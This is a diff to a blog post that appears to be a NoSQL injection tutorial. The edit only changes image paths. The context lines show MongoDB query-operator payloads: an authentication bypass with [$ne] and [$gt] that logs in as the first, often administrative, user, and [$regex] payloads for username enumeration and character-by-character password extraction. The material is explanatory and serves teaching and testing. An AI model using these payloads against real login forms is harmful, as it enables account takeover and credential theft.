@@ -17,16 +17,16 @@ Putting all together<br/>
 ```javascript
 user=test&pass=test to user[$ne]=test&pass[$ne]=test
 ```
-![intercept_request]({{ site.baseurl }}/images/Capture du 2017-05-15 12-59-35.png)
+![intercept_request](/images/Capture du 2017-05-15 12-59-35.png)
 
 ##### or use
 ```javascript
 user[$gt]=&pass[$gt]=
 ```
-![intercept_request_2]({{ site.baseurl }}/images/Capture du 2017-05-15 13-04-13.png)
+![intercept_request_2](/images/Capture du 2017-05-15 13-04-13.png)
 
 ##### 4 : You're now logged in as the first user in the database (which is often an administrator)
-![get_logged_as_admin]({{ site.baseurl }}/images/Capture du 2017-05-15 13-06-26.png)
+![get_logged_as_admin](/images/Capture du 2017-05-15 13-06-26.png)
 
 <br/>
 <br/>
@@ -45,13 +45,13 @@ This time we're going to use the query contructor [$regex] : <br/>
 ```javascript
 user[$regex]=root&pass[$gt]=
 ```
-![dic_attack_1]({{ site.baseurl }}/images/Capture du 2017-05-15 13-20-52.png)
+![dic_attack_1](/images/Capture du 2017-05-15 13-20-52.png)
 
 
 ```javascript
 user[$regex]=alex&pass[$gt]=
 ```
-![dic_attack_2]({{ site.baseurl }}/images/Capture du 2017-05-15 13-25-10.png)
+![dic_attack_2](/images/Capture du 2017-05-15 13-25-10.png)
 
 So we know that the username alex exists and root doesn't.
 
@@ -84,12 +84,12 @@ Once again we're going to use the query contructor [$regex].
 ```javascript
 user[$gt]=&pass[$regex]=.{0} through user[$gt]=&pass[$regex]=.{5}
 ```
-![pass_length]({{ site.baseurl }}/images/Capture du 2017-05-15 13-33-34.png)
+![pass_length](/images/Capture du 2017-05-15 13-33-34.png)
 
 ```javascript
 user[$gt]=&pass[$regex]=.{6}
 ```
-![pass_length_2]({{ site.baseurl }}/images/Capture du 2017-05-15 13-35-00.png)
+![pass_length_2](/images/Capture du 2017-05-15 13-35-00.png)
 
 So the password of the first user is 5 characters long.
 
@@ -99,27 +99,27 @@ So the password of the first user is 5 characters long.
 ```javascript
 user[$gt]=&pass[$regex]=a.{4}
 ```
-![pass_dump]({{ site.baseurl }}/images/Capture du 2017-05-15 13-38-04.png)
+![pass_dump](/images/Capture du 2017-05-15 13-38-04.png)
 
 ```javascript
 user[$gt]=&pass[$regex]=ad.{3}
 ```
-![pass_dump_2]({{ site.baseurl }}/images/Capture du 2017-05-15 13-39-14.png)
+![pass_dump_2](/images/Capture du 2017-05-15 13-39-14.png)
 
 ```javascript
 user[$gt]=&pass[$regex]=adm.{2}
 ```
-![pass_dump_3]({{ site.baseurl }}/images/Capture du 2017-05-15 13-40-32.png)
+![pass_dump_3](/images/Capture du 2017-05-15 13-40-32.png)
 
 ```javascript
 user[$gt]=&pass[$regex]=admi.{1}
 ```
-![pass_dump_4]({{ site.baseurl }}/images/Capture du 2017-05-15 13-41-36.png)
+![pass_dump_4](/images/Capture du 2017-05-15 13-41-36.png)
 
 ```javascript
 user[$gt]=&pass[$regex]=admin{0}
 ```
-![pass_dump_5]({{ site.baseurl }}/images/Capture du 2017-05-15 13-42-46.png)
+![pass_dump_5](/images/Capture du 2017-05-15 13-42-46.png)
 
 So the password of the first user in the database is : admin
 
